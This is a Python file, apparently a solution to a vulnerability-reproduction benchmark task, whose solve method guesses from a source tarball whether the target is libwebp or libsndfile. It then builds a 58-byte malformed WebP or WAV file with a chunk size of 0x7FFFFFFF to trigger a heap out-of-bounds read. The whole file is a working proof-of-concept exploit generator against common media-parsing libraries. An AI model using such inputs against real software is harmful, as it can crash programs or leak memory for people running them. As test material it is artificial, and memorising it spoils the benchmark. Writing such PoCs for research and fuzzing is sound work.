import struct
import tarfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability allows out-of-bounds reads when data size is not checked against RIFF chunk end.
        Target is likely libsndfile (WAV) or potentially libwebp.
        """
        
        # Attempt to identify if the target is libwebp instead of libsndfile
        is_webp = False
        try:
            if 'webp' in os.path.basename(src_path).lower():
                is_webp = True
            elif tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r:*') as tar:
                    # Check first few file names
                    count = 0
                    for name in tar.getnames():
                        if 'libwebp' in name.lower():
                            is_webp = True
                            break
                        if 'libsndfile' in name.lower():
                            break
                        count += 1
                        if count > 50:
                            break
        except Exception:
            pass

        if is_webp:
            # Construct a WebP PoC (58 bytes)
            # RIFF Header (12) + VP8 Chunk Header (8) + Data (38)
            # RIFF size = 50 (file size 58 - 8)
            poc = b'RIFF'
            poc += struct.pack('<I', 50)
            poc += b'WEBP'
            
            # Malformed VP8 chunk
            poc += b'VP8 '
            poc += struct.pack('<I', 0x7FFFFFFF) # Large size to trigger overflow
            
            # Padding to reach 58 bytes
            poc += b'\x00' * (58 - len(poc))
            return poc
        
        # Default: Construct a WAV PoC for libsndfile (58 bytes)
        # RIFF Header (12) + fmt chunk (24) + data chunk header (8) + payload (14)
        
        # 1. RIFF Header
        poc = b'RIFF'
        poc += struct.pack('<I', 50) # Size: 58 - 8
        poc += b'WAVE'
        
        # 2. fmt chunk (Standard PCM 44.1kHz 16-bit mono)
        poc += b'fmt '
        poc += struct.pack('<I', 16) # Chunk size
        # Format(1), Channels(1), Rate(44100), ByteRate(88200), Align(2), Bits(16)
        poc += struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
        
        # 3. data chunk (Malformed)
        poc += b'data'
        # Size set to large positive value to exceed file bounds and trigger OOB read
        poc += struct.pack('<I', 0x7FFFFFFF) 
        
        # Fill remaining bytes (14 bytes) to reach exactly 58 bytes
        poc += b'\x00' * (58 - len(poc))
        
        return poc